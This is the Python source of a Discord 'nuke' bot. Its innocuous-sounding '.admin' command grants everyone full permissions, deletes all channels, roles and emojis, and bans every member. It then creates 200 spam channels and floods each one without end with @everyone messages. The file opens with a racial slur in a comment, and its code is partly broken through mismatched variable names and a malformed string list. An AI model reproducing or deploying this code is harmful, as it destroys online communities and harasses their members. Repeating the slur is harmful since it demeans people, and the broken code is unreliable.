# vertix
# lol
# niqqers stfu
import discord
from discord.ext import commands
import random
from discord import Permissions
from colorama import Fore, Style
import asyncio
import os

#PASTE YOUR BOT TOKEN
token = "REPLACE_WITH_YOUR_ACTUAL_BOT_TOKEN"
#Enter Prefix For Your Bot
vertix = "."
owner = "ultrax71" # carbonate


SPAM_CHANNELS =  "NUKED-BY-CARBON"
SPAM_MESSAGES = "@everyone @here eat carbon",
"@everyone @here Carbonated lmao"

# change as your wish

client = commands.Bot(command_prefix=vertix)

  
print('''

███╗░░██╗██╗░░░██╗██╗░░██╗███████╗
████╗░██║██║░░░██║██║░██╔╝██╔════╝
██╔██╗██║██║░░░██║█████═╝░█████╗░░
██║╚████║██║░░░██║██╔═██╗░██╔══╝░░
██║░╚███║╚██████╔╝██║░╚██╗███████╗
╚═╝░░╚══╝░╚═════╝░╚═╝░░╚═╝╚══════╝''')
print("made-by-vertix")


@client.event
async def on_ready():
 
   await client.change_presence(activity=discord.Game(name="carbonater"))
   print("Logged in as" + client.user.name)
 
@client.command()
async def stop(ctx):
  await ctx.reply('> **Log Out | Shut down successfully**')
  await client.close()
  





@client.command()
async def admin(ctx):
    await ctx.message.delete()
    guild = ctx.guild
    try:
      role = discord.utils.get(guild.roles, name = "everyone")
      await role.edit(permissions = Permissions.all())
      print(Fore.MAGENTA + "I have given everyone admin." + Fore.RESET)
    except:
      print(Fore.GREEN + "I was unable to give everyone admin" + Fore.RESET)
    for channel in guild.channels:
      try:
        await channel.delete()
        print(Fore.MAGENTA + f"{channel.name} was deleted." + Fore.RESET)
      except:
        print(Fore.GREEN + f"{channel.name} was NOT deleted." + Fore.RESET)
    for member in guild.members:
     try:
       await member.ban()
       print(Fore.MAGENTA + f"{member.name}#{member.discriminator} Was banned" + Fore.RESET)
     except:
       print(Fore.GREEN + f"{member.name}#{member.discriminator} Was unable to be banned." + Fore.RESET)
    for role in guild.roles:
     try:
       await role.delete()
       print(Fore.MAGENTA + f"{role.name} Has been deleted" + Fore.RESET)
     except:
       print(Fore.GREEN + f"{role.name} Has not been deleted" + Fore.RESET)
    for emoji in list(ctx.guild.emojis):
     try:
       await emoji.delete()
       print(Fore.MAGENTA + f"{emoji.name} Was deleted" + Fore.RESET)
     except:
       print(Fore.GREEN + f"{emoji.name} Wasn't Deleted" + Fore.RESET)
    banned_users = await guild.bans()
    for ban_entry in banned_users:
      user = ban_entry.user
      try:
        await user.unban(owner)
        print(Fore.MAGENTA + f"{user.name}#{user.discriminator} Was successfully unbanned." + Fore.RESET)
      except:
        print(Fore.GREEN + f"{user.name}#{user.discriminator} Was not unbanned." + Fore.RESET)
    await guild.create_text_channel(SPAM_CHANNEL)
    for channel in guild.text_channels:
        link = await channel.create_invite(max_age = 0, max_uses = 100)
        print(f"New Invite: {link}")
    amount = 200
    for i in range(amount):
       await guild.create_text_channel(SPAM_CHANNEL)
    print(f"nuked {guild.name} Successfully.")
    return


@client.event
async def on_guild_channel_create(channel):
  while True:
    await channel.send(random.choice(SPAM_MESSAGES))

client.run(token)

# IF ANY GLITCH PLEASE CONTACT
# ULTRAX71 ON DISCORD
